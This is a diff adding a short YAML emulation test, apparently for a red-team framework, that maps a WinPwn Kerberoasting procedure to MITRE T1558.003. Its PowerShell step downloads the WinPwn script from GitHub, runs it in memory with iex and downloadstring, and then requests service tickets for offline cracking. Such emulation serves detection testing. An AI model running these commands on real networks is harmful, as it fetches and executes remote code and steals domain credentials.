@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: WinPwn - Kerberoasting
+description: Kerberoasting technique via function of WinPwn
+uuid: 78d10e20-c874-45f2-a9df-6fea0120ec27
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1558: Steal or Forge Kerberos Tickets'
+    subtechniques:
+        - 'T1558.003: Kerberoasting'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---kerberoasting
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        Kerberoasting -consoleoutput -noninteractive
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
